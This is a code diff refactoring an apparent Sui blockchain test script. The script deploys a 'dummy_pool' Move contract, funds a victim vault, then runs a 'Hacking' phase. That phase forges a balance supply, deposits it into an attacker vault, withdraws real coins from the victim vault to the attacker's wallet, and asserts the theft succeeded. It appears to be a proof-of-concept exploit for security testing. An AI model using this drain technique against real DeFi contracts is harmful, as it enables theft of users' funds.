@@ -4,7 +4,6 @@ let { ? } = import! lancer.sui.sui_address
 let { object_change_kind, ObjectChange, ? } = import! lancer.rpc
 let { ? } = import! std.byte
 let array = import! std.array
-let tx = import! lancer.transaction
 let c = import! lancer.compiler
 let {
     current_wallet,
@@ -20,18 +19,21 @@ let { find_map } = import! std.foldable
 let { unwrap } = import! std.option
 let { is_empty } = import! std.array
 let { TypeTag, StructTag } = import! lancer.sui.types
-let { ObjectRef, ObjectArg, ? } = import! lancer.transaction.types
+let { new_builder, ObjectRef, ObjectArg, ? } = import! lancer.transaction
 let { ? } = import! lancer.sui.types
 let { parse } = import! lancer.parse
 let { assert } = import! std.assert
+let { unwrap_ok, ? } = import! std.result
 
-do p = c.compile "../../sui/dummy_pool"
-do b = tx.builder
-tx.publish_immutable b (c.bytes p) (c.dep_ids p)
-do t = tx.finish b
 start
 io.print ("Preparation: " ++ (show (unwrap (current_wallet ()))) ++ "\n")
-do r = execute t None
+do p = c.compile "../../sui/dummy_pool"
+let tx =
+    let b = new_builder ()
+    b.publish_immutable (c.bytes p) (c.dep_ids p)
+    b.finish ()
+do r = execute (unwrap_ok tx) None
+
 let package_id = unwrap (find_map (\x ->
     match x with
     | Published { package_id, ? } -> Some package_id
@@ -87,19 +89,20 @@ let some_coin_object_ref: ObjectRef = unwrap (find_map (\x ->
         }, ? } -> if address == sui_framework && type_params == [some_coin_type] then Some (object_id, version, digest) else None
     | _ -> None) r.object_changes)
 
-do b = tx.builder
-do state_ref = tx.object_ref b (SharedObject {
-    id = state_id,
-    initial_shared_version = state_version,
-    mutable = True,
-})
-do price = tx.u64 b 10000
-tx.move_call b package_id "dummy_pool" "create_vault" [ some_coin_type ] [
-    state_ref,
-    price
-]
-do t = tx.finish b
-do r = execute t None
+let tx =
+    let b = new_builder ()
+    do state_arg = b.object_ref (SharedObject {
+        id = state_id,
+        initial_shared_version = state_version,
+         mutable = True,
+    })
+    b.move_call package_id "dummy_pool" "create_vault" [ some_coin_type ] [
+        state_arg,
+        unwrap_ok (b.u64 10000)
+    ]
+    b.finish ()
+do r = execute (unwrap_ok tx) None
+
 let (vault_id, vault_version) = unwrap (find_map (\x ->
     match x with
     | Created {
@@ -119,51 +122,54 @@ let (vault_id, vault_version) = unwrap (find_map (\x ->
 // io.print (show r.object_changes)
 
 do user = generate_keypair
-do b = tx.builder
-tx.pay b [some_coin_object_ref] [10000000] [user]
-do t = tx.finish b
-do r = execute t None
+let tx =
+    let b = new_builder ()
+    b.pay [some_coin_object_ref] [10000000] [user]
+    b.finish ()
+do r = execute (unwrap_ok tx) None
+
 do coins = get_coins some_coin_struct user
 let _ = assert(array.len coins == 1)
 let coin = array.index coins 0
 
-
-do b = tx.builder
-do state_arg = tx.object_ref b (SharedObject {
-    id = state_id,
-    initial_shared_version = state_version,
-    mutable = True,
-})
-do vault_arg = tx.object_ref b (SharedObject {
-    id = vault_id,
-    initial_shared_version = vault_version,
-    mutable = True,
-})
-do coin_arg = tx.object_ref b (ImmOrOwnedObject (coin.coin_object_id, coin.version, coin.digest))
-tx.move_call b package_id "dummy_pool" "deposit" [ some_coin_type ] [
-    state_arg,
-    vault_arg,
-    coin_arg
-]
-do t = tx.finish b
-do r = execute t (Some user)
+let tx =
+    let b = new_builder ()
+    do state_arg = b.object_ref (SharedObject {
+        id = state_id,
+        initial_shared_version = state_version,
+        mutable = True,
+    })
+    do vault_arg = b.object_ref (SharedObject {
+        id = vault_id,
+        initial_shared_version = vault_version,
+        mutable = True,
+    })
+    do coin_arg = b.object_ref (ImmOrOwnedObject (coin.coin_object_id, coin.version, coin.digest))
+    b.move_call package_id "dummy_pool" "deposit" [ some_coin_type ] [
+        state_arg,
+        vault_arg,
+        coin_arg
+    ]
+    b.finish ()
+do r = execute (unwrap_ok tx) (Some user)
 // io.print (show r)
 commit
 io.print ("Hacking: " ++ (show (unwrap (current_wallet ()))) ++ "\n")
 
-do b = tx.builder
-do price = tx.u64 b 10000
-do state_ref = tx.object_ref b (SharedObject {
-    id = state_id,
-    initial_shared_version = state_version,
-    mutable = True,
-})
-tx.move_call b package_id "dummy_pool" "create_vault" [ U64 ] [
-    state_ref,
-    price
-]
-do t = tx.finish b
-do r = execute t None
+let tx =
+    let b = new_builder ()
+    do state_arg = b.object_ref (SharedObject {
+        id = state_id,
+        initial_shared_version = state_version,
+        mutable = True,
+    })
+    b.move_call package_id "dummy_pool" "create_vault" [ U64 ] [
+        state_arg,
+        unwrap_ok (b.u64 10000)
+    ]
+    b.finish ()
+do r = execute (unwrap_ok tx) None
+
 let (hacker_vault_id, hacker_vault_version) = unwrap (find_map (\x ->
     match x with
     | Created {
@@ -182,65 +188,69 @@ let (hacker_vault_id, hacker_vault_version) = unwrap (find_map (\x ->
     | _ -> None) r.object_changes)
 io.print ("Hacker vault " ++ (show hacker_vault_id) ++ " created\n")
 
-do b = tx.builder
-do otw = tx.u64 b 0
-do supply = tx.move_call b sui_framework "balance" "create_supply" [U64] [otw]
-do amount = tx.u64 b 10000000
-do balance = tx.move_call b sui_framework "balance" "increase_supply" [U64] [supply, amount]
-do state_arg = tx.object_ref b (SharedObject {
-    id = state_id,
-    initial_shared_version = state_version,
-    mutable = True,
-})
-do hacker_vault_arg = tx.object_ref b (SharedObject {
-    id = hacker_vault_id,
-    initial_shared_version = hacker_vault_version,
-    mutable = True,
-})
-do lst = tx.move_call b package_id "dummy_pool" "deposit_balance" [U64] [
-    state_arg,
-    hacker_vault_arg,
-    balance
-]
-do vault_arg = tx.object_ref b (SharedObject {
-    id = vault_id,
-    initial_shared_version = vault_version,
-    mutable = True,
-})
-do goods = tx.move_call b package_id "dummy_pool" "withdraw_balance" [ some_coin_type ] [
-    state_arg,
-    vault_arg,
-    lst
-]
-do goods = tx.move_call b sui_framework "coin" "from_balance" [some_coin_type] [goods]
-do hacker_arg = tx.address b (unwrap (current_wallet ()))
-tx.move_call b sui_framework "transfer" "public_transfer" [Struct {
-    address = sui_framework,
-    module = "coin",
-    name = "Coin",
-    type_params = [some_coin_type],
-}] [
-    goods,
-    hacker_arg,
-]
-do init_version = tx.u64 b 0
-let supply_type: TypeTag = Struct {
-    address = sui_framework,
-    module = "balance",
-    name = "Supply",
-    type_params = [U64],
-}
-do versioned_arg = tx.move_call b sui_framework "versioned" "create" [supply_type] [init_version, supply]
-tx.move_call b sui_framework "transfer" "public_freeze_object" [Struct {
-    address = sui_framework,
-    module = "versioned",
-    name = "Versioned",
-    type_params = [],
-}] [
-    versioned_arg,
-]
-do t = tx.finish b
-do r = execute t None
+let tx =
+    let b = new_builder ()
+    do supply_arg = b.move_call sui_framework "balance" "create_supply" [U64] [unwrap_ok (b.u64 0)]
+    do balance_arg = b.move_call sui_framework "balance" "increase_supply" [U64] [
+        supply_arg,
+        unwrap_ok (b.u64 10000000)
+    ]
+    do state_arg = b.object_ref (SharedObject {
+        id = state_id,
+        initial_shared_version = state_version,
+        mutable = True,
+    })
+    do hacker_vault_arg = b.object_ref (SharedObject {
+        id = hacker_vault_id,
+        initial_shared_version = hacker_vault_version,
+        mutable = True,
+    })
+    do lst_arg = b.move_call package_id "dummy_pool" "deposit_balance" [U64] [
+        state_arg,
+        hacker_vault_arg,
+        balance_arg
+    ]
+    do vault_arg = b.object_ref (SharedObject {
+        id = vault_id,
+        initial_shared_version = vault_version,
+        mutable = True,
+    })
+    do goods_arg = b.move_call package_id "dummy_pool" "withdraw_balance" [ some_coin_type ] [
+        state_arg,
+        vault_arg,
+        lst_arg
+    ]
+    do goods_arg = b.move_call sui_framework "coin" "from_balance" [some_coin_type] [goods_arg]
+    b.move_call sui_framework "transfer" "public_transfer" [Struct {
+        address = sui_framework,
+        module = "coin",
+        name = "Coin",
+        type_params = [some_coin_type],
+    }] [
+        goods_arg,
+        unwrap_ok (b.address (unwrap (current_wallet ()))),
+    ]
+
+    let supply_type: TypeTag = Struct {
+        address = sui_framework,
+        module = "balance",
+        name = "Supply",
+        type_params = [U64],
+    }
+    do versioned_arg = b.move_call sui_framework "versioned" "create" [supply_type] [
+        unwrap_ok (b.u64 0),
+        supply_arg
+    ]
+    b.move_call sui_framework "transfer" "public_freeze_object" [Struct {
+        address = sui_framework,
+        module = "versioned",
+        name = "Versioned",
+        type_params = [],
+    }] [
+        versioned_arg,
+    ]
+    b.finish ()
+do r = execute (unwrap_ok tx) None
 // io.print (show r)
 do balance = get_balance some_coin_struct (unwrap (current_wallet ()))
 let _ = assert(balance > 0)
